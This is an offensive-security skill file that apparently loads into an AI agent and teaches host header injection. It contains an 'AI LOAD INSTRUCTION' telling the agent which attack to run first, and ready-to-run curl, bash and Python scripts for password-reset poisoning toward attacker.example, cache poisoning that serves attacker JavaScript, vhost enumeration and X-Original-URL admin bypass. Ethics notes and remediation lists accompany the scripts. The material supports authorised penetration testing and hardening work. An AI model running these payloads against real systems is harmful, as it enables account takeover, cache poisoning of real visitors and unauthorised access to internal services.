---
name: attack-host-header
description: "Host header injection — password reset poisoning, cache poisoning, routing bypass, SSRF via absolute URLs"
category: "web-application"
version: "1.1"
author: "cyberstrike-official"
tags:
  - host-header
  - web
  - injection
  - cache
  - attack
tech_stack:
  - web
  - nginx
  - apache
cwe_ids:
  - CWE-644
  - CWE-20
chains_with:
  - attack-cache-poison
  - attack-ssrf
  - attack-open-redirect
prerequisites: []
severity_boost:
  attack-cache-poison: "Host header + cache = poisoning every user of the cached page"
  attack-ssrf: "Host header reaching an internal vhost = internal surface exposure"
---

# Host Header Injection

> **AI LOAD INSTRUCTION**: The `Host` header is attacker-controlled and developers routinely
> treat it as trusted. It is trusted by the *front-end* router and untrusted by *everyone
> else*, and the gap between those two facts is where the bugs live. The three escalating
> outcomes are: **routing bypass** (reach a vhost you should not), **content injection**
> (poison a cache or a link), and **credential theft** (poison a password-reset link so the
> token lands on the attacker's domain). The single highest-impact test is password reset
> with a modified `Host` — run it first, before any other technique here.
>
> Modern stacks add `X-Forwarded-Host` and `Forwarded`, which are equally attacker-controlled
> and far less likely to be validated. **Test all of them, not just `Host`.**

## 0. RELATED ROUTING

- [http-host-header-attacks](../http-host-header-attacks/SKILL.md) — the long-form companion; load alongside this file
- [attack-cache-poison](../attack-cache-poison/SKILL.md) — the escalation that multiplies impact
- [attack-ssrf](../attack-ssrf/SKILL.md) — absolute-URL construction reaching internal hosts
- [attack-open-redirect](../attack-open-redirect/SKILL.md) — the generic form of the same trust gap
- [http2-specific-attacks](../http2-specific-attacks/SKILL.md) — authority/`:authority` handling in HTTP/2
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — reporting the chain, not just the header

---

## 1. WHERE THE HEADER IS TRUSTED

Establish which parts of the application build URLs or make routing decisions from the request
host. Each is a distinct finding class.

| Use | What the attacker gains |
|---|---|
| password reset / invite links | **token stolen — account takeover** |
| absolute redirect targets | open redirect |
| cache key composition | cache poisoning |
| vhost routing / backend selection | internal host access |
| link generation in emails | content injection |
| CORS `ACAO` value | cross-origin trust bypass |
| SSRF URL construction | internal request |
| canonical / SEO tags | content injection |
| cookie domain scoping | cookie injection for a parent domain |

**Start with password reset.** It is the one that directly yields account takeover, and the
test is a single request.

---

## 2. PASSWORD RESET POISONING — RUN THIS FIRST

The mechanism: the application builds the reset URL from the request host rather than a
configured value.

```bash
# 1. Request a reset for the victim
curl -s -X POST https://TARGET/api/password-reset \
  -H "Host: evil.com" \
  -d "email=victim@example.com"

# 2. Inspect the reset link delivered to the victim's inbox.
#    Vulnerable:  https://evil.com/reset?token=SECRET
#    Safe:        https://TARGET/reset?token=SECRET
```

**Variant headers — test each, they are handled by different middleware:**

```bash
-H "Host: evil.com"
-H "X-Forwarded-Host: evil.com"
-H "X-Forwarded-Server: evil.com"
-H "X-HTTP-Host-Override: evil.com"
-H "Forwarded: host=evil.com"
-H "X-Original-URL: /admin"
-H "X-Rewrite-URL: /admin"
```

**The `Host: TARGET.evil.com` variant is often the one that works.** A filter checking
`host.endsWith("TARGET.com")` is passed by the attacker's domain appearing *before* it, or a
check for `contains("TARGET.com")` is passed by any domain containing the string. Try both
orderings.

**Absolute-URL variants** — some frameworks take the host from a `X-Forwarded-Proto`-driven
URL builder rather than `Host`:

```bash
-H "Host: TARGET" -H "X-Forwarded-Proto: https" -H "X-Forwarded-Host: evil.com"
```

**Confirm the token is valid, not just the link.** The finding is only critical if the emitted
token resets the account. If the link is poisoned but the token is bound to the host, impact
is lower — say so.

**Related: the reset-host header in the email body.** Some implementations put the host in an
`<img>` or a link inside the template; check the raw email source, not the rendered preview.

---

## 3. ROUTING AND VHOST BYPASS

The reverse proxy routes by `Host`. Changing it moves your request to a different backend.

**Internal vhost discovery:**

```bash
for h in localhost admin internal api stage dev test jenkins gitlab grafana; do
  printf "%-12s " "$h"
  curl -s -o /dev/null -w "%{http_code} %{size_download}\n" \
    -H "Host: $h" https://TARGET/
done
```

**A different status or body size means a different backend answered.** That is the signal —
the reverse proxy is routing on the header and the internal vhost is reachable from the DMZ.

**Common high-value vhosts:**

```text
localhost        admin            internal         intranet
jenkins          gitlab           grafana          prometheus
kibana           elastic          kubernetes       docker
api-internal     backend          db-admin         phpmyadmin
```

**`localhost` is the highest-yield single probe.** Many default nginx/apache configs serve a
different application on the default vhost, and it frequently lacks the authentication the
public one has.

**Try both schemes and both ports** — a vhost may only be reachable over plain HTTP, or only
on a non-standard port that the proxy forwards.

---

## 4. CACHE POISONING CHAINS

A host-header bug alone is often medium. Combined with a cache, it poisons every subsequent
visitor — which is critical.

**Preconditions, all of which must hold:**

| Requirement | How to confirm |
|---|---|
| the response is cached | `X-Cache: HIT` on a second request |
| the `Host` header is **not** part of the cache key | change `Host`, get the same cache entry |
| an unkeyed header influences the body | `X-Forwarded-Host` reflected in the response |
| the cache is shared | a CDN or reverse proxy, not per-user |

**The exploit shape:**

```bash
# 1. Poison: the response body reflects X-Forwarded-Host, and the cache does not key on it.
curl -s https://TARGET/page \
  -H "X-Forwarded-Host: evil.com" \
  -H "X-Cache-Key-Influencer: __cachebuster__"

# 2. Verify the poisoned response is served to a clean request
curl -s https://TARGET/page
# → contains <script src="https://evil.com/x.js">  ← every visitor now loads attacker JS
```

**Unkeyed header candidates to test** — the cache ignores them, the application does not:

```text
X-Forwarded-Host    X-Forwarded-Scheme     X-Forwarded-Proto
X-Host              X-Original-URL         X-Rewrite-URL
X-Forwarded-Port    X-Forwarded-Prefix
```

**The `X-Forwarded-Host` + cache combination is the classic and still-frequent critical.**
Verify with a cache-buster so you do not poison production while testing.

**Behave ethically here.** Cache poisoning affects real users immediately. Use a unique
cache-buster parameter, and never poison a live page with a payload that executes on visitor
browsers. Demonstrate the mechanism with a benign marker.

---

## 5. OTHER OUTCOMES

| Outcome | Test |
|---|---|
| open redirect | `Host: evil.com` on a redirect endpoint — see [attack-open-redirect](../attack-open-redirect/SKILL.md) |
| SSRF via the host | `Host: internal-service` reaching an internal vhost |
| CORS bypass | the application echoes `Host` into `Access-Control-Allow-Origin` |
| cookie injection | `Host: evil.com` sets a cookie scoped to `.evil.com`; if a parent domain is shared, session fixation follows |
| canonical-tag injection | host reflected into `<link rel="canonical">` — SEO poisoning |
| link injection in emails | any generated link in any notification |
| DNS rebinding precursor | host reflected into a URL that is later fetched server-side |

**The cookie-domain angle is underrated.** If the app sets `Domain=.example.com` derived from
the host, and `evil.com` shares the parent, an attacker can set cookies the application reads
— session fixation with no CORS or XSS required.

---

## 6. WHAT CONSTITUTES A FINDING

| Finding | Severity | Proof required |
|---|---|---|
| Password reset link poisoned with a valid token | **Critical (P1)** | the delivered email and a successful reset |
| Cache poisoning of a page with attacker-controlled content | **Critical (P1)** | the poisoned response served to a clean request |
| Internal vhost reached with a different `Host` | **High (P2)** | the differing response and the internal content |
| Host reflected into a redirect target | **Medium (P3)** | the `Location` header |
| Host reflected into a canonical tag or body | **Low–Medium (P4)** | the reflected value |
| Host accepted but nothing reflects it | **Informational (P5)** | the differing status only |

---

## 7. EVIDENCE STANDARD

| Item | Why |
|---|---|
| the request with the modified `Host`/`X-Forwarded-Host` header | the trigger |
| the response showing the reflected or routed effect | the mechanism |
| for reset poisoning: the raw email source containing the link | proves the token left the server |
| for reset poisoning: a successful reset using that token | proves validity, not just reflection |
| for cache poisoning: a clean request served the poisoned content | proves the impact |
| the cache-buster used, if any | shows the test was contained |
| the differing backend response for vhost findings | proves routing, not a status artefact |
| a **negative control** with the correct `Host` | proves the difference is caused by the header |

**Redact the reset token in the report and state that it was valid.** Do not publish a live
token.

**False positives to exclude:**

| Looks like a finding | Actually |
|---|---|
| the app echoes your `Host` but ignores it for URL generation | reflection without effect |
| the reset link is poisoned but the token is host-bound | no usable token |
| a differing status code with an identical body | not a routing difference |
| the cache returned `MISS` every time | nothing is cached; no poisoning |
| your own browser carried the header | the server did not act on it |
| the vhost response is the same application | no bypass |

---

## 8. REMEDIATION REFERENCE

1. **Configure the canonical host explicitly** — never derive URLs from the request. Set a `base_url` / `APP_URL` / `SERVER_NAME` and use it for every generated link.
2. **Reject unknown `Host` values at the edge** — the reverse proxy should serve a default vhost or return 444/421 for a host it does not recognise. This closes vhost discovery entirely.
3. **Do not trust `X-Forwarded-*` from untrusted sources** — the proxy must overwrite, not append, these headers, and must strip any coming from the client.
4. **Include the host in the cache key** — or strip these headers before the cache lookup. Combined with (3), this closes cache poisoning.
5. **Bind reset and invite tokens to the intended host** — validate the token against the host that originally issued it, so a poisoned link cannot be redeemed.
6. **Never use `Host` to build redirect `Location` values** — use a relative path or a configured absolute base.
7. **Scope cookies to an exact host, not a parent domain** — avoid `Domain=.example.com` unless subdomain sharing is genuinely required, and mark them `Secure` and `HttpOnly`.
8. **Test host handling in CI** — a request with an arbitrary `Host` must not appear in any generated URL, `Location` header, or `ACAO` value.

---

## 9. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did the injected host **change the response** you received, not just the request? | the app trusts the header |
| 2 | Was there a **control** - the same request with the correct `Host`, which is normal? | the header caused it |
| 3 | Did the effect reach a **password-reset link, a cacheable page, or a redirect**? | the impact |
| 4 | Did you demonstrate the **victim-side consequence**, not just the reflected value? | e.g. a reset link pointing at your host |
| 5 | Is the effect **cacheable**, so it reaches other users? | the blast radius |
| 6 | Does the app accept **absolute-form, duplicate, or an `X-Forwarded-Host`** variant? | which header family |
| 7 | Did you avoid **sending a real password-reset email** to a real user? | engagement integrity |

**A demonstrable victim-side consequence is the bar.** A `Host` value reflected in a page is a candidate;
a password-reset link that delivers its token to your host is the finding.

---

## 10. EXECUTION PRIMITIVES

Host-header attacks are proven by **a response changed by an injected host, with the correct-host control,
and the victim-side consequence demonstrated**. Every block ends at a consequence.

### 10.1 The control and the injection

```bash
T="1.2.3.4"          # the IP, so the Host header is the only thing naming the site
HOSTNAME="target.example"; EVIL="attacker.example"
# THE CONTROL: the correct Host - this is the baseline page
curl -sS "https://$HOSTNAME/" -H "Host: $HOSTNAME" -o /tmp/h_ok.html -w 'control %{http_code} %{size_download}\n'
# THE INJECTION: the wrong Host
curl -sS "https://$T/" -H "Host: $EVIL" -o /tmp/h_bad.html -w 'injected %{http_code} %{size_download}\n'
# DIFF: what changed, and where
diff <(sed 's/[0-9a-f]\{8,\}/X/g' /tmp/h_ok.html) <(sed 's/[0-9a-f]\{8,\}/X/g' /tmp/h_bad.html) | head -30
echo "-> a difference in a URL, a canonical link, a script src, or a redirect target is the candidate"
# and the same with the absolute-form and the duplicate-header variants
curl -sS "https://$T/" -H "Host: $EVIL" --path-as-is "https://$EVIL/" -o /dev/null -w 'absolute-form %{http_code}\n' 2>/dev/null
curl -sS "https://$T/" -H "Host: $HOSTNAME" -H "Host: $EVIL" -o /dev/null -w 'dup-host %{http_code}\n' 2>/dev/null
# and the forwarding variants, which are the ones that actually work through a proxy
for H in "X-Forwarded-Host" "X-Host" "X-Forwarded-Server" "X-Original-Host" "Forwarded"; do
  printf '%-22s ' "$H"
  curl -sS "https://$HOSTNAME/" -H "$H: $EVIL" 2>/dev/null | grep -coE "https?://$EVIL" | sed 's/^/refs=/'
done
```

**The diff against the correct-host control is the diagnostic.** A 400 from the front end is a correct
rejection; a 200 whose content is unchanged is a non-finding.

### 10.2 The password-reset chain, the highest-impact case

```bash
T="https://target.example"; EVIL="attacker.example"; MAILBOX="attacker@mail.example"
# STEP 1 - request a reset with the poisoned host, using YOUR OWN account, not a victim's
curl -sS -D- -X POST "$T/api/password/forgot" \
  -H "Host: $EVIL" -H 'Content-Type: application/json' \
  -d "{\"email\":\"$MAILBOX\"}" 2>&1 | head -20
# STEP 2 - THE ARTEFACT: the email you receive contains a link whose host is $EVIL
echo "-> open the mailbox and copy the reset link VERBATIM - that link IS the finding"
echo "-> it must contain https://$EVIL/reset?token=... and NOT https://$T/reset?token=..."
# STEP 3 - prove the token is valid: request the same link against the REAL host
echo "-> the token from the poisoned link, used at https://$T/reset?token=..., must be accepted"
echo "-> that proves the link would have handed a valid token to the attacker's host"
# THE CONTROL: repeat with the correct Host and confirm the link points at target.example
curl -sS -X POST "$T/api/password/forgot" -H "Host: $T" \
  -H 'Content-Type: application/json' -d "{\"email\":\"$MAILBOX\"}" -o /dev/null -w 'control-request %{http_code}\n'
```

**Only ever use your own mailbox.** Sending a real reset to a real user is an incident; the finding is the
link's host, and your own account proves it.

### 10.3 The cache-chain and the routing bypass

```python
# a poisoned Host plus a cache equals a site-wide effect, which is the severity multiplier
import requests, time, random
T = "https://target.example"; EVIL = "attacker.example"
bust = f"?cb={random.randint(1,10**9)}"

# 1) poison: the cacheable page fetched with the injected host
r1 = requests.get(f"{T}/{bust}", headers={"X-Forwarded-Host": EVIL}, timeout=10)
print("poison:", r1.status_code, r1.headers.get("X-Cache"), "evil refs:", r1.text.count(EVIL))
# 2) victim: a clean request to the SAME key
r2 = requests.get(f"{T}/", timeout=10)
print("victim:", r2.status_code, r2.headers.get("X-Cache"), "evil refs:", r2.text.count(EVIL), "Age:", r2.headers.get("Age"))
if EVIL in r2.text:
    print("CHAIN CONFIRMED: the poisoned host is served to unmodified requests from cache")
print()
# 3) the ROUTING BYPASS form, which is a different finding - the header changes WHICH app answers
for h, v in [("X-Forwarded-Host", "internal.target.local"),
             ("X-Original-URL", "/admin"),
             ("X-Rewrite-URL", "/admin"),
             ("X-Forwarded-Prefix", "/admin")]:
    try:
        r = requests.get(f"{T}/", headers={h: v}, timeout=10, allow_redirects=False)
        print(f"{h:22} {v:28} -> {r.status_code} {r.headers.get('Location','')[:60]}")
    except Exception as e:
        print(f"{h:22} ERR {type(e).__name__}")
print()
print("a routing-bypass header that returns the ADMIN page is a separate, higher-severity finding")
print("than a reflected host. Report them separately and with separate evidence.")
```

**A routing bypass is a different finding from a reflected host.** `X-Original-URL: /admin` returning the
admin page is an access-control bypass, and it should be reported on its own.

### 10.4 The email, redirect, and absolute-URL surfaces

```bash
T="https://target.example"; EVIL="attacker.example"
# each surface that builds an absolute URL from the request host is a candidate
# 1) REDIRECT targets after login and logout
curl -sS -D- -o /dev/null "$T/login" -H "Host: $EVIL" 2>&1 | grep -iE '^location' | head -2
curl -sS -D- -o /dev/null "$T/logout" -H "X-Forwarded-Host: $EVIL" 2>&1 | grep -iE '^location' | head -2
# 2) the OpenID/SAML/OAuth metadata and the discovery document
curl -sS "$T/.well-known/openid-configuration" -H "Host: $EVIL" 2>/dev/null | head -c 300; echo
# 3) the sitemap, robots, and any link-generation endpoint
for P in /sitemap.xml /robots.txt /rss /feed; do
  printf '%-14s ' "$P"; curl -sS "$T$P" -H "Host: $EVIL" 2>/dev/null | grep -coE "https?://$EVIL" | sed 's/^/refs=/'
done
# 4) THE DEFENCE CHECK: does the server even accept a foreign Host
curl -sS -o /dev/null -w 'forged-host accepted? %{http_code}\n' "$T/" -H "Host: $EVIL" 2>/dev/null
curl -sS -o /dev/null -w 'random-host accepted?  %{http_code}\n' "$T/" -H "Host: $(head -c8 /dev/urandom | base64 | tr -d '/+=' | head -c8).example" 2>/dev/null
```

**Absence of a virtual-host allowlist is the root cause.** If a random host returns the same app, the
front end is not validating `Host` at all, and that single observation is worth stating in the report.

### 10.5 The end-to-end harness

```bash
python3 - <<'PY'
import requests, re
T = "https://target.example"; EVIL = "attacker.example"
print("=== CONTROL (correct host) ===")
ok = requests.get(f"{T}/", headers={"Host": "target.example"}, timeout=10)
print("  status", ok.status_code, "evil-refs", ok.text.count(EVIL))
print()
print("=== INJECTION VARIANTS ===")
V = [("Host", EVIL), ("X-Forwarded-Host", EVIL), ("X-Host", EVIL),
     ("X-Forwarded-Server", EVIL), ("X-Original-Host", EVIL), ("Forwarded", f"host={EVIL}")]
for h, v in V:
    try:
        r = requests.get(f"{T}/", headers={h: v}, timeout=10)
        refs = r.text.count(EVIL)
        links = re.findall(r'https?://' + re.escape(EVIL) + r'[^"\'\s<>]{0,40}', r.text)[:3]
        print("  %-22s %s refs=%-3s %s" % (h, r.status_code, refs, links))
    except Exception as e:
        print("  %-22s ERR %s" % (h, type(e).__name__))
print()
print("=== ROUTING BYPASS ===")
for h, v in [("X-Original-URL", "/admin"), ("X-Rewrite-URL", "/admin")]:
    r = requests.get(f"{T}/", headers={h: v}, timeout=10, allow_redirects=False)
    print("  %-18s %-8s -> %s %s" % (h, v, r.status_code, r.headers.get("Location","")[:50]))
print()
print("FINDING = a changed response with a VICTIM-SIDE consequence")
print("          (a reset link, a redirect target, a poisoned cache entry),")
print("          with the correct-host control unchanged.")
print("A reflected host with no consequence is a low-severity information issue - label it as one.")
PY
```

**A consequence, not a reflection.** The reset-link host, the `Location` target, and the cache effect are
consequences; a reflected `evil.example` string alone is not.

---

## 11. EVIDENCE STANDARD — HOST ARTEFACTS

| Item | Why |
|---|---|
| The **correct-`Host` control response** | the baseline the diff is measured against |
| The **injecting request**, with the exact header and value | reproducibility |
| The **changed response**, diffed and quoted | proves the app trusts the header |
| The **victim-side consequence**: the reset link, the `Location`, the cached body | the impact |
| The **token validity** of a reset link that pointed at your host | proves the token was live |
| Whether the effect is **cacheable**, with the HIT evidence | the blast radius |
| Whether the header is **routing-relevant**, and the resulting access | a separate, higher-severity finding |
| The **front end's `Host` validation behaviour**, including a random host | the root cause |
| Which **header family** worked (`Host`, `X-Forwarded-Host`, absolute-form, `Forwarded`) | the fix |
| Confirmation that **no real user received a message** | engagement integrity |

Report the **consequence and the control**: "`POST /api/password/forgot` with the correct `Host` sends a
link to `https://target.example/reset?token=...`, which is the control. The same request with
`Host: attacker.example` and my own address delivers an email whose link is
`https://attacker.example/reset?token=8781...`, and using that token at
`https://target.example/reset?token=8781...` returned the password form, which proves the token was live
and would have been delivered to a host I control. A random `Host` of `q7x2k.example` also returns the
application, so the front end does not validate `Host` at all. Separately, `GET /` with
`X-Original-URL: /admin` returns the administrative page with a `200`, which is an access-control
finding and is reported on its own", never "the server trusts the Host header".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A **`Host` value reflected** in the page with no consequence | a low-severity information issue; label it |
| A `400` from the front end on a foreign `Host` | correct rejection |
| A **404 or a default vhost** for the injected host | the front end routed it away |
| An `X-Forwarded-Host` you injected that **changed nothing** | the header is not consumed |
| A finding requiring a **misconfigured reverse proxy you do not control** | a different precondition |
| A **cache HIT in your own session** only | connection reuse, not a poisoned cache |
| An internal hostname in a **`VirtualHost` default page** | information disclosure at most |
| A reset link pointing at your host **with a token that is already invalid** | the impact is unproven |
| A test that **sent a real message to a real user** | an incident you caused |
| A routing bypass on an endpoint that **requires authentication you already hold** | not a bypass |
| A finding on a **local development instance** with no `Host` validation | verify the deployment |

**A victim-side consequence with the correct-host control.** This family's catalogue of non-findings is
dominated by reflected values with no consequence and by tests that changed nothing.

---

## 12. REMEDIATION REFERENCE — HOST VALIDATION HARDENING

1. **Configure the web server with an explicit virtual-host allowlist and return `400` for any `Host` that is not on it** - it removes the entire family at the front end, and it is one configuration block.
2. **Never generate an absolute URL from the request's `Host` header; use a configured base URL from the environment** - the reflection is the mechanism, and removing it removes the password-reset, redirect, and link-generation impacts at once.
3. **Consume `X-Forwarded-Host` only at the edge, from a trusted proxy, and overwrite it with the resolved value before it reaches the application** - an untrusted forwarded header is as dangerous as an untrusted `Host`.
4. **Strip or reject `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-Prefix`, and their relatives at the edge unless a component you control requires them** - the routing-bypass family is the highest-severity variant.
5. **Add `Vary: Host` where the response legitimately depends on the host, and never cache a response that reflects a request header** - it prevents the cache chain.
6. **Bind password-reset and email-verification tokens to the account and the originating host, and validate the host on redemption** - it converts a stolen link into nothing.
7. **Set a canonical `Host` in every response's `Content-Security-Policy` and use only absolute URLs from configuration in `Location` headers** - it removes the reflection surface.
8. **Reject duplicate `Host` headers and absolute-form request targets at the front end** - both are parser-disagreement variants of the same defect.
9. **Log the `Host` header of every request, and alert on values outside the allowlist** - the enumeration is trivial and the signal is clean.
10. **Keep the edge proxy and the application's URL-generation logic reviewed together; this defect is a mismatch between them** - a fix in one layer is frequently undone by the other.
11. **Test the `Host` handling with a random hostname on every deployment, and re-test after any proxy or vhost change** - the regression here is silent and total.

---

## 13. RELATED SIBLINGS - LOAD TOGETHER

- [http-host-header-attacks](../http-host-header-attacks/SKILL.md) - the full technique reference
- [attack-cache-poison](../attack-cache-poison/SKILL.md) - the chain that turns a reflected host into a site-wide effect
- [open-redirect](../open-redirect/SKILL.md) - the `Location` consequence of a trusted host
- [attack-cors](../attack-cors/SKILL.md) - the sibling origin-trust defect
- [web-cache-deception](../web-cache-deception/SKILL.md) - the key-confusion effect a host mismatch can produce
